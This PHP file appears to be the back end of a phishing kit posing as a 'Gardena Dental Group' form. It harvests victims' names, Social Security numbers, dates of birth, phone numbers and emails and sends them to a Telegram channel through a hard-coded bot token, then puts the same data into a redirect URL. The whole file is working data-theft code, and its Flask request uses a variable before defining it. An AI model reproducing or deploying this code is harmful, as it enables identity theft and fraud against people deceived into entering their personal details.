<?php
if (isset($_POST['submit'])) {
    $firstName = $_POST['first_name'] ?? '';
    $lastName = $_POST['last_name'] ?? '';
    $phone = $_POST['phone'] ?? '';
    $email = $_POST['email'] ?? '';
    $dob = $_POST['dob'] ?? '';
    $ssn = $_POST['ssn'] ?? '';  
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $ipAddress = $_POST['ip_address'] ?? ''; 
    $message = "Gardena Dental Group\n\nFirst Name : $firstName\nLast Name : $lastName\nSSN : $ssn\nDOB : $dob\nPhone : $phone\nEmail : $email\n\nIP Address : $ipAddress\nUser Agent : $userAgent";
    
    $apiToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
    $chatId = '@rezolucijax';
    
    $telegramUrl = "https://api.telegram.org/bot$apiToken/sendMessage";
    $telegramData = [
        'chat_id' => $chatId,
        'text' => $message,
    ];
    $formData = http_build_query([
        'first_name' => $firstName,
        'last_name' => $lastName,
        'phone' => $phone,
        'email' => $email,
        'dob' => $dob,
        'ssn' => $ssn,
        'ip_address' => $ipAddress,
        'user_agent' => $userAgent
    ]); 

    $chFlask = curl_init($flaskUrl);
    curl_setopt($chFlask, CURLOPT_POST, true);
    curl_setopt($chFlask, CURLOPT_POSTFIELDS, $formData);
    curl_setopt($chFlask, CURLOPT_RETURNTRANSFER, true);
    $flaskResponse = curl_exec($chFlask);
    curl_close($chFlask);
    if ($flaskResponse === false) {
        echo "Error sending data to Flask: " . curl_error($chFlask);
    }
    $chTelegram = curl_init($telegramUrl);
    curl_setopt($chTelegram, CURLOPT_POST, true);
    curl_setopt($chTelegram, CURLOPT_POSTFIELDS, http_build_query($telegramData));
    curl_setopt($chTelegram, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($chTelegram, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
    $telegramResponse = curl_exec($chTelegram);
    curl_close($chTelegram);
    $flaskUrl = "/set_data?" . $formData;
    header("Location: " . $flaskUrl);
    exit;
}
?>